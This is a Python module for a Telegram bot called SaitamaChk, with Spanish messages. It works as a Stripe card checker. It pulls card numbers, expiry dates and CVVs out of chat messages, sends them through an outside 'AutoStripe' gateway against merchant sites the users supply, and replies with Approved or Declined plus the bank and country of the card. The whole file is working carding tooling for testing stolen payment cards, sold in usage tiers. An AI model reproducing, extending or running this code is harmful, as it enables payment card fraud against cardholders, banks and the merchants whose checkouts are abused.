# st.py - Stripe Checker para SaitamaChk (FINAL)

import logging
import re
import time
import asyncio
import aiohttp

import db
from antispam import antispam_guard
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler, MessageHandler, filters

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("st")

BOT_TAG = '<a href="http://t.me/SaitamaChecker_Bot">[拳]</a>'

# ==============================
# CONFIG
# ==============================

STRIPE_API_BASE = "https://md-auto-stripe.onrender.com/gateway=AutoStripe/key=md-tech"
REQUEST_TIMEOUT = 90
CONNECT_TIMEOUT = 15

CC_REGEX = r'(\d{14,16})[:,;/|•\s]+(\d{1,2})[:,;/|•\s]+(\d{2,4})[:,;/|•\s]+(\d{3,4})'

busy_users = {}

# ==============================
# LIMITES
# ==============================

def get_limit(uid: int) -> int:
    return 4 if db.is_owner(uid) or db.is_admin(uid) or db.is_premium(uid) else 2

def can_run(uid: int) -> bool:
    return busy_users.get(uid, 0) < get_limit(uid)

def mark_start(uid: int):
    busy_users[uid] = busy_users.get(uid, 0) + 1

def mark_end(uid: int):
    if uid in busy_users:
        busy_users[uid] -= 1
        if busy_users[uid] <= 0:
            busy_users.pop(uid, None)

# ==============================
# HELPERS
# ==============================

def extract_card(text: str):
    m = re.search(CC_REGEX, text)
    if not m:
        return None
    n, mm, yy, cvv = m.groups()
    return {
        "number": n,
        "month": mm.zfill(2),
        "year": yy[-2:],
        "cvv": cvv
    }

def build_cc(c):
    return f"{c['number']}|{c['month']}|20{c['year']}|{c['cvv']}"

def clean_site(site: str) -> str:
    return site.replace("https://", "").replace("http://", "").replace("www.", "")

def get_bin(card_number: str):
    from bin import get_bin_info
    return get_bin_info(card_number[:6])

# ==============================
# STATUS (NORMALIZADO)
# ==============================

def format_status(status: str) -> str:
    s = status.lower()
    if "approved" in s:
        return "Approved ✅"
    if "declined" in s:
        return "Declined ❌"
    return "Error ⚠️"

# ==============================
# API CALL
# ==============================

async def check_stripe(card, site):
    cc = build_cc(card)
    site_clean = clean_site(site)
    url = f"{STRIPE_API_BASE}/site={site_clean}/cc={cc}"

    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)

    try:
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                try:
                    data = await resp.json()
                except Exception:
                    raw = await resp.text()
                    return "Error", raw[:200]

                return (
                    data.get("Status", "Error"),
                    data.get("Response", "N/A")
                )

    except asyncio.TimeoutError:
        return "Error", "TIMEOUT"
    except Exception as e:
        return "Error", str(e)[:80]

# ==============================
# FORMATO FINAL
# ==============================

def format_result(cc, status, response, bininfo, site_i, t, user):
    return (
        f"{BOT_TAG} <b>Gateway:</b> <code>Stripe</code>\n"
        "━━━━━━━━━━━━━━━━\n"
        f"{BOT_TAG} <b>CC:</b> <code>{cc}</code>\n"
        f"{BOT_TAG} <b>Status:</b> <code>{format_status(status)}</code>\n"
        f"{BOT_TAG} <b>Response:</b> <code>{response}</code>\n"
        "━━━━━━━━━━━━━━━━\n"
        f"{BOT_TAG} <b>Info:</b> <code>{bininfo['info']}</code>\n"
        f"{BOT_TAG} <b>Bank:</b> <code>{bininfo['bank']}</code>\n"
        f"{BOT_TAG} <b>Country:</b> <code>{bininfo['country']}</code>\n"
        "━━━━━━━━━━━━━━━━\n"
        f"{BOT_TAG} <b>Site:</b> {site_i}\n"
        f"{BOT_TAG} <b>Time:</b> {t:.2f}s\n"
        f"{BOT_TAG} <b>Req by:</b> @{user}"
    )

# ==============================
# /ST
# ==============================

async def handle_st(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    user = update.effective_user.username or update.effective_user.first_name
    msg = update.message

    if not await antispam_guard(update, context):
        return

    if not can_run(uid):
        await msg.reply_text("⏳ Límite de verificaciones alcanzado.", reply_to_message_id=msg.message_id)
        return

    if not db.get_user(uid):
        await msg.reply_text("❌ Debes registrarte primero.", reply_to_message_id=msg.message_id)
        return

    # 👉 MENSAJE + REPLY
    text = msg.text or ""
    if msg.reply_to_message and msg.reply_to_message.text:
        text += "\n" + msg.reply_to_message.text

    card = extract_card(text)
    if not card:
        await msg.reply_text("❌ No se detectó una CC válida.", reply_to_message_id=msg.message_id)
        return

    sites = db.get_user_stripe_sites(uid)
    if not sites:
        await msg.reply_text("❌ No tienes sitios Stripe.", reply_to_message_id=msg.message_id)
        return

    mark_start(uid)
    processing = await msg.reply_text("🔄 Checking Stripe...", reply_to_message_id=msg.message_id)
    start = time.time()

    try:
        site = sites[0]
        status, response = await check_stripe(card, site)
        elapsed = time.time() - start
        bininfo = get_bin(card["number"])

        await processing.edit_text(
            format_result(
                build_cc(card),
                status,
                response,
                bininfo,
                1,
                elapsed,
                user
            ),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    finally:
        mark_end(uid)

# ==============================
# REGISTER
# ==============================

def register_handlers(app):
    app.add_handler(CommandHandler("st", handle_st))
    app.add_handler(MessageHandler(filters.Regex(r"^\.st\b"), handle_st))
    logger.info("Handlers ST cargados")